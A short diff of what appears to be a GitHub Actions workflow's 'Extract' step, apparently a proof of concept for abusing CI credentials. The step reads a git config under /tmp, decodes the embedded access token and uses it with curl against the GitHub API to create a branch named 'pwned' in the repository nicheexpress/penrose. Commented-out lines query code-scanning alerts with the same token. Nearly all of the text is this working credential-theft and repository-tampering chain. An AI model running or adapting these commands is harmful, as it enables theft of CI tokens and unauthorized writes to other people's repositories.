@@ -48,7 +48,6 @@ jobs:
 
       - name: Extract
         run: |        
-          ls /tmp
           cd /tmp/.git
           cat config | base64
           token=$(grep -o 'basic .*' config | sed "s|basic ||g" | base64 -d | sed "s|x-access-token:||g")
@@ -58,6 +57,6 @@ jobs:
           #curl --location 'https://api.github.com/repos/$TARGET_REPO/code-scanning/alerts' --header 'Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}'
           #curl --location 'https://api.github.com/repos/nicheexpress/penrose/code-scanning/alerts' --header "Authorization: Bearer $token" -v
           curl --location 'https://api.github.com/repos/nicheexpress/penrose/git/refs' --header "Authorization: Bearer $token" --data '{"ref": "refs/heads/pwned", "sha": "6fbf9621d55a1616c980561025762f3fe06f4194"}' 
-          cat reaper
+          cat $GITHUB_WORKSPACE/reaper
 
         
